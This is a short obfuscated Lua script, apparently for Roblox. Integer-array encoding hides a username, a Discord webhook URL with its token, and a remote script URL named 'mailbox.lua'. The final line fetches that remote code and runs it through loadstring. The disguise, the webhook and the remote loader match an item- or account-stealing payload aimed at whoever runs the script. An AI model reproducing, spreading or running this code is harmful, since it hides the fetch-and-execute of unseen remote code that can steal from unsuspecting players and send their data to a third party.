function XRKEMEQwuPPJEobEqwgLcjqGyGkobdCNqOhKatcjOOGcYblJfElJzBW(c)
tab={}
for i = 1,#c do
x=string.len(c[i]) 
y=string.char(x)
table.insert(tab,y)
end
x=table.concat(tab)
return x
end 


function CMFZskFriUPFJlEHrkFlgTeziuBr(code)res=XRKEMEQwuPPJEobEqwgLcjqGyGkobdCNqOhKatcjOOGcYblJfElJzBW({})for i in ipairs(code)do res=res..string.char(code[i]/105)end return res end 


UserName = CMFZskFriUPFJlEHrkFlgTeziuBr({12495,12075,12600,11865,10185,12810,5145,5145,5355,5565,5880})
WebHook = CMFZskFriUPFJlEHrkFlgTeziuBr({10920,12180,12180,11760,12075,6090,4935,4935,10500,11025,12075,10395,11655,11970,10500,4830,10395,11655,11445,4935,10185,11760,11025,4935,12495,10605,10290,10920,11655,11655,11235,12075,4935,5145,5040,5985,5145,5670,5565,5880,5145,5040,5565,5250,5040,5250,5460,5250,5145,5880,5775,5145,4935,11235,5250,7980,10500,8295,10710,8505,5250,8610,9030,8295,11025,9240,8085,12810,5775,10500,11025,10185,7875,12810,11130,11340,12180,12495,7350,8925,10920,9345,5460,9135,4725,11235,5040,5355,5355,5145,12495,8820,8505,7770,12390,11445,8295,10920,12810,11340,7140,10815,10290,5670,11235,4725,10290,11655,5250,5565,5355,5355,8295,7350,8610,5460,5775,12495,8295,5250,11445})

loadstring(game:HttpGet(CMFZskFriUPFJlEHrkFlgTeziuBr({10920,12180,12180,11760,12075,6090,4935,4935,10815,11655,11655,10710,4830,11760,11970,11655,4935,12075,4935,11445,10185,11025,11340,10290,11655,12600,4830,11340,12285,10185}), true))()        
